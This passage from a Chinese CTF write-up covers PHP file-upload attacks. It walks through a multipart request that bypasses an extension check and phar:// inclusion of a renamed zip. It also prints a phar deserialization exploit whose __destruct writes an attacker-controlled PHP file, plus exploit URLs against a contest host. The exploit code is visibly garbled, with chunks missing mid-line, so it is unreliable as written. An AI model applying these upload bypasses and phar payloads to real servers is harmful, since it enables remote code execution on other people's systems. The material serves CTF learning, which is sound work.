        }
        else{
            highlight_file(__FILE__);
        }
    ?>
可以看到前半段的代码和前面一道是很相似的，都用了 end 函数来处理文件的后缀名。但是这里没有进行图片后缀的判断，而是进行下面的判断：
    if($ext==$filename[count($filename) - 1]){
                die("emmmm...");
            }
而根据 $filename 的来源
    $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name'];
    $ext = end($filename);
我们也可以类似的构造 $_POST[‘file’] ，也就是自己插入一个字段 file ：
    ------WebKitFormBoundarywrXtm4qsIjhjlklR
    Content-Disposition: form-data; name="file[2]"
    2.php
    ------WebKitFormBoundarywrXtm4qsIjhjlklR
    Content-Disposition: form-data; name="file"; filename="1.php"
    Content-Type: application/x-php
    GIF89a PHP5.3之后支持了类似Java的jar包，名为phar。用来将多个PHP文件打包为一个文件。
后面的两种用法都用一个 SUCTF 招新赛的例子来说明：
点开题目发现只有一个上传点，且只能上传 png、jpg、gif 文件，无法绕过后缀上传 shell
####  正常用法
第一种方法就是他的常规用法了，将 php 文件压缩成 zip 文件，zip 文件改后缀为 png 之后
例如将下面的代码放在 1.php 中，压缩成 1.zip 并改名 1.png后上传
上传文件之后在右键 -> 源代码中可以看到上传的地址，复制出来并用 phar:// 协议进行访问
    http://49.4.68.67:86/?act=get&pic=phar:///var/www/html/sandbox/5eac5f7bd6358e10ff53dec9f3bb8690/4a47a0db6e60853dedfcfdf08a5ca249.png/1.php
在 f12 中可以看到很多符号都被过滤了，这里尝试了也没法直接绕过
后来发现 set-cookie 中给了提示：
    Set-Cookie: hint=cGxlYXNlIHJlYWQgcmVjZW50IHBhcGVycyBhYm91dCBwaGFy
    --> please read recent papers about phar
于是这里想到了phar 的反序列化漏洞，貌似这个操作在 hitcon2017 的 Baby^H-master-php-2017
中就出现了，但是那个实在太难了…
####  phar 反序列化漏洞
具体的原理这里也不说了，大概的用法可以看下面的这两篇文章：
直接放官方的 exp 吧：
    current_dir=$dir;
             if(!is_dir($dir))@mkdir($dir);
         }
         private function _log($message){
             array_push($this->actions,'['.date('y-m-d h:i:s',time()).']'.$message);
         }
         public function pics(){
             log('list pics');
             $pics=[];
             foreach(scandir($dir) as $item){
                 if(in_array(substr($item,-4),$whitelist))
                     array_push($pics,$current_dir."/".$item);
             }
             return $pics;
         }
         public function upload_pic(){
             _log('upload pic');
             $file=$_FILES['file']['name'];
             if(!in_array(substr($file,-4),$this->whitelist)){
                 _log('unsafe deal:upload filename '.$file);
                 return;
             }
             $newname=md5($file).substr($file,-4);
             move_uploaded_file($_FILES['file']['tmp_name'],$current_dir.'/'.$newname);
         }
         public function get_pic($picname){
             _log('get pic'.$picname);
             if(!file_exists($picname))
                 return '';
             else return file_get_contents($picname);
         }
         public function __destruct(){
             $fp=fopen($this->current_dir.'/'.$this->logfile,"a+");
             foreach($this->actions as $act){
                 fwrite($fp,$act."n");
             }
             fclose($fp);
         }
         public function gen(){
             @rmdir($this->current_dir);
             $this->current_dir="/var/www/html/sandbox/a6bfb20ba19df73fcceb438f5f75948f/"; //md5($_SERVER['REMOTE_ADDR'])
             $this->logfile='H4lo.php';
             $this->actions=['startBuffering();
             $phar->setStub("GIF89a".""); //设置stub，增加gif文件头用以欺骗检测
             $phar->setMetadata($this); //将自定义meta-data存入manifest
             $phar->addFromString("test.txt", "test"); //添加要压缩的文件
                     //签名自动计算
             $phar->stopBuffering();
         }
     }
    $pic=new PicManager('/var/www/html/sandbox');
    $pic->gen();
运行 php 脚本会在当前目录下生成 phar.phar 文件（需要在 php.ini 中将 phar.readonly 设置为 Off）
接着将 phar.phar 重命名为 phar.gif ，上传之后同样复制出地址，利用 phar 协议包含文件以后，就会触发反序列化漏洞，将我们前面 exp
中的代码执行（生成 H4lo.php）。
    http://49.4.68.67:86/?act=get&pic=phar:///var/www/html/sandbox/a6bfb20ba19df73fcceb438f5f75948f/1b33718042e7dfe8fac079be96ebc4d9.gif
  * 这里只需要 phar://xxx.gif 的形式就好了，因为这是一个 phar 对象文件，不是一个压缩包
访问一下，这样就得到 flag 了：
###  PHP 自包含特性
这个技巧可以看我之前的写过的[一篇文章](https://www.anquanke.com/post/id/153376)，也是来源于一道 ctf （百度杯
nlog 进阶版）
这个自包含和下面的反序列化上传的姿势，都是需要自己构造文件上传页面，感觉脑洞还是挺大了，稍微了解一下就好了
###  反序列化上传
这个也是来源于一道 ctf（jarvisoj phpinfo），题目地址
附上详细的解答：
简而言之，就是自己构造一个上传界面，将 file 字段的 filename 定义为反序列化的字符串，服务器处理的时候就会触发这个漏洞。
        test XXE
## 总结
在近些比赛中将文件上传和文件包含结合起来，作为考点进行考察的题目还是蛮多的。在比赛中多总结一下姿势还是挺有帮助的，无论是在今后的 ctf
比赛中还是实战的漏洞挖掘。